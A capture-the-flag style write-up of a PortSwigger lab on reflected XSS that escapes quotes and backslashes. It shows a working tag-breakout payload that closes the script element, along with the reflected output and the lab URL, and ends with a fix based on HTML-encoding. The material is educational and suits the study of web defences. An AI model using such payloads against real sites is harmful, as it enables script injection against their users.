# PoC: Reflected XSS into a JavaScript String With Single Quote and Backslash Escaped

**Lab:** PortSwigger — Reflected XSS into a JavaScript string with single quote and backslash escaped
**Status:** Solved ✅

## Vulnerability

The search term is reflected inside a JavaScript string assignment:

```js
var searchTerms = 'hello';
```

## Steps

1. **Confirm reflection** — searched `hello'bro`, saw the input land inside a `<script>` block:
   ```js
   var searchTerms = 'hello\'bro';
   ```

2. **Test the escaping** — the single quote came back as `\'`, showing the app escapes `'` and `\`. So breaking out of the JS string with a quote won't work — the string context itself is safe.

3. **Break out at the tag level instead** — since the whole assignment sits inside a real `<script>` element, the fix doesn't matter if the `</script>` tag can be closed and a fresh `<script>` opened. Payload:
   ```
   </script><script>alert("xss")</script>
   ```

4. Reflected output:
   ```html
   <script>var searchTerms = '</script><script>alert("xss")</script>';</script>
   ```
   The injected `</script>` ends the original block early, and the new `<script>alert("xss")</script>` executes as its own element — the escaping on `'`/`\` never comes into play.

5. `alert("xss")` fires → lab solved.

## Payload

```
https://YOUR-LAB-ID.web-security-academy.net/?search=</script><script>alert("xss")</script>
```

## Fix

Escaping quotes/backslashes only protects the JS-string context — it does nothing against HTML tag injection. The output needs HTML-encoding (`<` → `&lt;`, `>` → `&gt;`) wherever it's placed inside an HTML document, in addition to JS-string escaping for the script context.
